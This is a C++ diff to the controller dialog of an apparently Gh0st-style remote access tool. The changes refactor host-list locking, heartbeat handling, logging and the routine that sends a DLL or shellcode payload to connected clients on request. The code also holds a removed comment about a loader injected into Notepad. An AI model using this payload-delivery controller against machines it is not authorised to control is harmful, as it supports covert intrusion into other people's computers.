@@ -750,7 +750,6 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
         auto ctx = *i;
         if (ctx == ContextObject || ctx->GetClientID() == id) {
             LeaveCriticalSection(&m_cs);
-            Mprintf("TODO: '%s' already exist!!\n", strIP);
             return;
         }
     }
@@ -2058,7 +2057,7 @@ BOOL CMy2015RemoteDlg::Activate(const std::string& nPort,int nMaxConnection, con
                 pids.back() = '?';
             }
             if (IDYES == THIS_APP->MessageBox("调用函数StartServer失败! 错误代码:" + CString(std::to_string(ret).c_str()) +
-                                    "\r\n是否关闭以下进程重试: " + pids.c_str(), "提示", MB_YESNO)) {
+                                              "\r\n是否关闭以下进程重试: " + pids.c_str(), "提示", MB_YESNO)) {
                 for (const auto& line : lines) {
                     auto cmd = std::string("taskkill /f /pid ") + line;
                     exec(cmd.c_str());
@@ -2094,21 +2093,23 @@ BOOL CALLBACK CMy2015RemoteDlg::NotifyProc(CONTEXT_OBJECT* ContextObject)
         Dlg->OnReceiveComplete();
         Dlg->MarkReceiving(false);
     } else {
-        HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-        if (hEvent == NULL) {
+        HANDLE hEvent = USING_EVENT ? CreateEvent(NULL, TRUE, FALSE, NULL) : NULL;
+        if (USING_EVENT && !hEvent) {
             Mprintf("===> NotifyProc CreateEvent FAILED: %p <===\n", ContextObject);
             return FALSE;
         }
         if (!g_2015RemoteDlg->PostMessage(WM_HANDLEMESSAGE, (WPARAM)hEvent, (LPARAM)ContextObject)) {
             Mprintf("===> NotifyProc PostMessage FAILED: %p <===\n", ContextObject);
-            CloseHandle(hEvent);
+            if (hEvent) CloseHandle(hEvent);
             return FALSE;
         }
-        HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
-        DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
-        if (result == WAIT_FAILED) {
-            DWORD err = GetLastError();
-            Mprintf("NotifyProc WaitForMultipleObjects failed, error=%lu\n", err);
+        if (hEvent) {
+            HANDLE handles[2] = { hEvent, g_2015RemoteDlg->m_hExit };
+            DWORD result = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+            if (result == WAIT_FAILED) {
+                DWORD err = GetLastError();
+                Mprintf("NotifyProc WaitForMultipleObjects failed, error=%lu\n", err);
+            }
         }
     }
     return TRUE;
@@ -2314,23 +2315,18 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     case TOKEN_HEARTBEAT:
     case 137: // 心跳【L】
-        g_2015RemoteDlg->SendMessage(WM_UPDATE_ACTIVEWND, 0, (LPARAM)ContextObject);
+        g_2015RemoteDlg->PostMessageA(WM_UPDATE_ACTIVEWND, 0, (LPARAM)ContextObject);
         break;
     case SOCKET_DLLLOADER: {// 请求DLL【L】
         auto len = ContextObject->InDeCompressedBuffer.GetBufferLength();
         bool is64Bit = len > 1 ? ContextObject->InDeCompressedBuffer.GetBYTE(1) : false;
         int typ = (len > 2 ? ContextObject->InDeCompressedBuffer.GetBYTE(2) : MEMORYDLL);
         bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
-        int connNum = 0;
-        if (typ == SHELLCODE) {
-            Mprintf("===> '%s' Request SC [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
-        } else {
-            Mprintf("===> '%s' Request DLL [is64Bit:%d isRelease:%d]\n", ContextObject->RemoteAddr().c_str(), is64Bit, isRelease);
-        }
         char version[12] = {};
         ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
-        // TODO 注入记事本的加载器需要更新
-        SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
+        BOOL send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
+        Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n", ContextObject->RemoteAddr().c_str(),
+                typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
         break;
     }
     case COMMAND_BYE: { // 主机下线【L】
@@ -2417,7 +2413,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     }
     auto duration = clock() - tick;
-    if (duration > 200) {
+    if (duration > 100) {
         Mprintf("[%s] Command '%s' [%d] cost %d ms\n", __FUNCTION__, ContextObject->PeerName.c_str(), cmd, duration);
     }
 }
@@ -2435,9 +2431,7 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
         strIP = ContextObject->GetPeerName().c_str();
         // 不合法的数据包
         if (ContextObject->InDeCompressedBuffer.GetBufferLength() < sizeof(LOGIN_INFOR)) {
-            char buf[100];
-            sprintf_s(buf, "*** Received [%s] invalid login data! ***\n", strIP.GetString());
-            Mprintf(buf);
+            Mprintf("*** Received [%s] invalid login data! ***\n", strIP.GetString());
             return -1;
         }
 
@@ -2482,7 +2476,12 @@ LRESULT CMy2015RemoteDlg::OnUserToOnlineList(WPARAM wParam, LPARAM lParam)
 
 LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 {
-    Mprintf("======> OnUserOfflineMsg\n");
+    auto host = FindHost((int)lParam);
+    if (host) {
+        Mprintf("======> OnUserOfflineMsg: %s\n", host->GetPeerName().c_str());
+        CLock L(m_cs);
+        m_HostList.erase(host);
+    }
     CString ip, port;
     port.Format("%d", lParam);
     EnterCriticalSection(&m_cs);
@@ -2492,7 +2491,6 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
         if (cur == port) {
             ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
             auto ctx = (context*)m_CList_Online.GetItemData(i);
-            m_HostList.erase(ctx);
             m_CList_Online.DeleteItem(i);
             ShowMessage("操作成功", ip + "主机下线");
             break;
@@ -2512,7 +2510,8 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
     return S_OK;
 }
 
-LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam)
+{
     CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)lParam;
     UpdateActiveWindow(ctx);
 
@@ -2521,6 +2520,13 @@ LRESULT CMy2015RemoteDlg::UpdateUserEvent(WPARAM wParam, LPARAM lParam) {
 
 void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
 {
+    auto host = FindHost(ctx);
+    if (!host) {
+        ctx->CancelIO();
+        Mprintf("UpdateActiveWindow failed: %s \n", ctx->GetPeerName().c_str());
+        return;
+    }
+
     Heartbeat hb;
     ctx->InDeCompressedBuffer.CopyBuffer(&hb, sizeof(Heartbeat), 1);
 
@@ -2546,15 +2552,29 @@ void CMy2015RemoteDlg::UpdateActiveWindow(CONTEXT_OBJECT* ctx)
             return;
         }
     }
-	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-		if (ctx->IsEqual(*i)) {
-			return;
-		}
-	}
-    ctx->CancelIO();
-    Mprintf("UpdateActiveWindow failed: %s \n", ctx->GetPeerName().c_str());
 }
 
+context* CMy2015RemoteDlg::FindHost(context* ctx)
+{
+    CLock L(m_cs);
+    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+        if (ctx->IsEqual(*i)) {
+            return ctx;
+        }
+    }
+    return NULL;
+}
+
+context* CMy2015RemoteDlg::FindHost(int port)
+{
+    CLock L(m_cs);
+    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+        if ((*i)->GetPort() == port) {
+            return *i;
+        }
+    }
+    return NULL;
+}
 
 void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
 {
@@ -2583,7 +2603,7 @@ bool isAllZeros(const BYTE* data, int len)
     return true;
 }
 
-VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit)
+BOOL CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, bool is64Bit)
 {
     auto id = is64Bit ? PAYLOAD_DLL_X64 : PAYLOAD_DLL_X86;
     auto buf = isDLL ? m_ServerDLL[id] : m_ServerBin[id];
@@ -2595,10 +2615,12 @@ VOID CMy2015RemoteDlg::SendServerDll(CONTEXT_OBJECT* ContextObject, bool isDLL, 
         memcpy(md5, (char*)ContextObject->InDeCompressedBuffer.GetBuffer(32), max(0,min(32, len-32)));
         if (!buf->MD5().empty() && md5 != buf->MD5()) {
             ContextObject->Send2Client(buf->Buf(), buf->length(!hasIV));
+            return TRUE;
         } else {
             ContextObject->Send2Client( buf->Buf(), 6 /* data not changed */);
         }
     }
+    return FALSE;
 }
 
 
